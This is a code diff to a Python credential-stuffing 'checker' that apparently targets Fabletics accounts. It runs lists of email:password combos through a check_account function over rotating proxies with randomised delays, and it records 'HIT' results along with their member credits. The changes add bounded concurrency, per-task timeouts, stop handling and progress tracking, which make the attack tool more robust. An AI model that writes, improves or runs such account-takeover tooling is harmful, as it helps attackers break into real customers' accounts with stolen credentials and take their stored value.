@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import itertools
+import os
 import random
 import threading
 import time
@@ -38,6 +39,7 @@ class JobStats:
     preparing: bool = False
     stop_requested: bool = False
     current: str = ""
+    last_progress_at: float = 0.0
     logs: list[str] = field(default_factory=list)
     log_seq: int = 0
 
@@ -95,8 +97,18 @@ class CheckerWorker:
         with self._lock:
             self.stats.stop_requested = True
 
+    def _reset_job_state(self) -> None:
+        self.stats.running = False
+        self.stats.preparing = False
+        self.stats.stop_requested = False
+        self.stats.current = ""
+        self.stats.last_progress_at = 0.0
+
     def snapshot(self) -> dict[str, Any]:
         with self._lock:
+            stopping = self.stats.stop_requested and (
+                self.stats.running or self.stats.preparing
+            )
             return {
                 "total": self.stats.total,
                 "queued": self.stats.queued,
@@ -110,7 +122,9 @@ class CheckerWorker:
                 "errors": self.stats.errors,
                 "running": self.stats.running,
                 "preparing": self.stats.preparing,
+                "stopping": stopping,
                 "current": self.stats.current,
+                "last_progress_at": self.stats.last_progress_at,
                 "log_seq": self.stats.log_seq,
                 "logs": list(self.stats.logs[-200:]),
             }
@@ -149,6 +163,7 @@ class CheckerWorker:
             for line in self._iter_combo_lines(combo_lines, combo_file):
                 with self._lock:
                     if self.stats.stop_requested:
+                        self._log("Stop requested — cancelled during prep")
                         return
 
                 raw_count += 1
@@ -202,6 +217,12 @@ class CheckerWorker:
                 self.stats.preparing = False
                 self.stats.running = False
             self._log(f"ERROR | job prep failed | {exc}")
+        finally:
+            with self._lock:
+                if self.stats.running or self.stats.preparing:
+                    if self.stats.stop_requested:
+                        self._log("Job stopped")
+                    self._reset_job_state()
 
     def _pick_proxy(self, proxies: list[str], index: int) -> str | None:
         if not proxies:
@@ -211,12 +232,13 @@ class CheckerWorker:
         return random.choice(proxies)
 
     def _record_result(self, email: str, password: str, result) -> None:
+        with self._lock:
+            self.stats.checked += 1
+            self.stats.last_progress_at = time.time()
+
         status = result.status.lower()
         if status in FINAL_STATUSES:
             mark_combo_checked(email, password, status)
-
-        with self._lock:
-            self.stats.checked += 1
 
         if result.status == "HIT":
             member_credits = int(result.data.get("member_credits") or 0)
@@ -268,9 +290,13 @@ class CheckerWorker:
         proxies: list[str],
         threads: int,
     ) -> None:
-        from concurrent.futures import ThreadPoolExecutor, as_completed
+        from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, TimeoutError, wait
 
         proxy_cycle = itertools.cycle(proxies) if proxies else None
+        combo_iter = iter(enumerate(combos))
+        inflight: dict = {}
+        max_inflight = max(threads * 3, 4)
+        task_timeout = int(os.environ.get("FABLETICS_TASK_TIMEOUT", "100"))
 
         def task(idx: int, email: str, password: str):
             with self._lock:
@@ -281,38 +307,69 @@ class CheckerWorker:
             proxy = self._pick_proxy(proxies, idx) if proxy_cycle else _UNSET
             return check_account(email, password, proxy=proxy, timeout=45)
 
-        try:
-            with ThreadPoolExecutor(max_workers=threads) as pool:
-                futures = {
-                    pool.submit(task, i, email, password): (email, password)
-                    for i, (email, password) in enumerate(combos)
-                }
-                for future in as_completed(futures):
-                    with self._lock:
-                        if self.stats.stop_requested:
-                            break
+        def submit_next(pool) -> bool:
+            with self._lock:
+                if self.stats.stop_requested:
+                    return False
+            try:
+                idx, (email, password) = next(combo_iter)
+            except StopIteration:
+                return False
+            future = pool.submit(task, idx, email, password)
+            inflight[future] = (email, password)
+            return True
 
-                    email, password = futures[future]
+        pool = ThreadPoolExecutor(max_workers=threads)
+        stopped = False
+        try:
+            for _ in range(min(max_inflight, len(combos))):
+                if not submit_next(pool):
+                    break
+
+            while inflight:
+                with self._lock:
+                    if self.stats.stop_requested:
+                        stopped = True
+                        for pending in list(inflight):
+                            pending.cancel()
+                        inflight.clear()
+                        self._log("Stop requested — halting checker")
+                        break
+
+                done, _ = wait(inflight, return_when=FIRST_COMPLETED, timeout=1.0)
+                if not done:
+                    continue
+
+                for future in done:
+                    email, password = inflight.pop(future)
                     try:
-                        result = future.result()
+                        result = future.result(timeout=task_timeout)
+                    except TimeoutError:
+                        with self._lock:
+                            self.stats.checked += 1
+                            self.stats.errors += 1
+                            self.stats.last_progress_at = time.time()
+                        self._log(f"TIMEOUT | {email} | exceeded {task_timeout}s")
                     except Exception as exc:
                         with self._lock:
                             self.stats.checked += 1
                             self.stats.errors += 1
+                            self.stats.last_progress_at = time.time()
                         self._log(f"ERROR | {email} | {exc}")
-                        continue
+                    else:
+                        if result is not None:
+                            self._record_result(email, password, result)
+                        if not stopped:
+                            time.sleep(random.uniform(0.15, 0.45))
 
-                    if result is None:
-                        continue
-
-                    self._record_result(email, password, result)
-                    time.sleep(random.uniform(0.15, 0.45))
+                    if not stopped:
+                        submit_next(pool)
         finally:
+            pool.shutdown(wait=False, cancel_futures=True)
             with self._lock:
-                self.stats.running = False
-                self.stats.preparing = False
-                self.stats.stop_requested = False
-                self.stats.current = ""
+                if stopped or self.stats.stop_requested:
+                    self._log("Job stopped")
+                self._reset_job_state()
 
 
 worker = CheckerWorker()
